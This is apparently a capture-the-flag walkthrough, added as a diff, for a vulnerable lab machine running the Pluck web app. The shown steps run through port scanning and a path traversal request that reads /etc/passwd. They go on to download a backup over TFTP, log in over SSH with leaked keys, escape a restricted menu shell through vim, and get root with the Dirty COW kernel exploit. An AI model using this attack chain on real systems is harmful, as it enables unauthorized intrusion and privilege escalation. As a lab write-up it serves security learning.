@@ -1,0 +1,133 @@
+Recon Phase :
+
+
+$ nmap -p 1-65535 -T4 -A -v 172.16.34.152
+PORT     STATE SERVICE VERSION
+22/tcp   open  ssh     OpenSSH 7.3p1 Ubuntu 1 (Ubuntu Linux; protocol 2.0)
+| ssh-hostkey:
+|   2048 e8:87:ba:3e:d7:43:23:bf:4a:6b:9d:ae:63:14:ea:71 (RSA)
+|_  256 8f:8c:ac:8d:e8:cc:f9:0e:89:f7:5d:a0:6c:28:56:fd (ECDSA)
+80/tcp   open  http    Apache httpd 2.4.18 ((Ubuntu))
+| http-methods:
+|_  Supported Methods: GET HEAD POST OPTIONS
+|_http-server-header: Apache/2.4.18 (Ubuntu)
+|_http-title: Pluck
+3306/tcp open  mysql   MySQL (unauthorized)
+5355/tcp open  llmnr?
+
+Then i did a scan using OWASP and nikto and confitm infected with Path Traversal
+============================================================================
+Attacking Phase:
+
+http://172.16.34.152/index.php?page=%2Fetc%2Fpasswd
+******************************************************
+daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
+bin:x:2:2:bin:/bin:/usr/sbin/nologin
+sys:x:3:3:sys:/dev:/usr/sbin/nologin
+sync:x:4:65534:sync:/bin:/bin/sync
+games:x:5:60:games:/usr/games:/usr/sbin/nologin
+man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
+lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
+mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
+news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
+uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
+proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
+www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
+backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
+list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
+irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
+gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
+nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
+systemd-timesync:x:100:102:systemd Time Synchronization,,,:/run/systemd:/bin/false
+systemd-network:x:101:103:systemd Network Management,,,:/run/systemd/netif:/bin/false
+systemd-resolve:x:102:104:systemd Resolver,,,:/run/systemd/resolve:/bin/false
+systemd-bus-proxy:x:103:105:systemd Bus Proxy,,,:/run/systemd:/bin/false
+syslog:x:104:108::/home/syslog:/bin/false
+_apt:x:105:65534::/nonexistent:/bin/false
+messagebus:x:106:109::/var/run/dbus:/bin/false
+mysql:x:107:111:MySQL Server,,,:/nonexistent:/bin/false
+lxd:x:108:65534::/var/lib/lxd/:/bin/false
+uuidd:x:109:114::/run/uuidd:/bin/false
+dnsmasq:x:110:65534:dnsmasq,,,:/var/lib/misc:/bin/false
+sshd:x:111:65534::/var/run/sshd:/usr/sbin/nologin
+pollinate:x:112:1::/var/cache/pollinate:/bin/false
+bob:x:1000:1000:bob,,,:/home/bob:/bin/bash
+Debian-exim:x:113:119::/var/spool/exim4:/bin/false
+peter:x:1001:1001:,,,:/home/peter:/bin/bash
+paul:x:1002:1002:,,,:/home/paul:/usr/bin/pdmenu
+backup-user:x:1003:1003:Just to make backups easier,,,:/backups:/usr/local/scripts/backup.sh
+******************************************************
+I tried a lot then i accessed backup.sh via
+http://172.16.34.152/index.php?page=/usr/local/scripts/backup.sh
+******************************************************
+########################
+# Server Backup script #
+########################
+
+#Backup directories in /backups so we can get it via tftp
+
+echo "Backing up data"
+tar -cf /backups/backup.tar /home /var/www/html > /dev/null 2& > /dev/null
+echo "Backup complete"
+******************************************************
+Then accessed tftp
+$ tftp 172.16.34.152
+Then i downloaded backup.tar
+$ get backup.tar
+Then from my local machine i extracted the file and it contain 2 directories
+home and var
+i looked inside home
+home/
+├── bob
+├── paul
+│   └── keys
+│       ├── backup.tar
+│       ├── id_key1
+│       ├── id_key1.pub
+│       ├── id_key2
+│       ├── id_key2.pub
+│       ├── id_key3
+│       ├── id_key3.pub
+│       ├── id_key4
+│       ├── id_key4.pub
+│       ├── id_key5
+│       ├── id_key5.pub
+│       ├── id_key6
+│       └── id_key6.pub
+└── peter
+
+it contain RSA keys
+Then i tried with all keys to access paul user via SSH
+# ssh -i id_key4 paul@172.16.34.152
+Then i access a shell with menus and i tried a lot hen i found an idea
+from Edit file then i entered /;bash then vim started and i closed it with :q
+and now i'm in a bash shell
+============================================================================
+Privilege escalation:
+
+I used dirty cow exploit https://www.exploit-db.com/exploits/40616/
+$ gcc cowroot.c -o cowroot -pthread
+$ ./cowroot
+$ echo 0 > /proc/sys/vm/dirty_writeback_centisecs
+$ id
+uid=0(root) gid=1002(paul) groups=1002(paul)
+# cat /root/flag.txt
+
+Congratulations you found the flag
+
+---------------------------------------
+
+######   ((((((((((((((((((((((((((((((
+#########   (((((((((((((((((((((((((((
+,,##########   ((((((((((((((((((((((((
+@@,,,##########   (((((((((((((((((((((
+@@@@@,,,##########
+@@@@@@@@,,,############################
+@@@@@@@@@@@,,,#########################
+@@@@@@@@@,,,###########################
+@@@@@@,,,##########
+@@@,,,##########   &&&&&&&&&&&&&&&&&&&&
+,,,##########   &&&&&&&&&&&&&&&&&&&&&&&
+##########   &&&&&&&&&&&&&&&&&&&&&&&&&&
+#######   &&&&&&&&&&&&&&&&&&&&&&&&&&&&&
+============================================================================
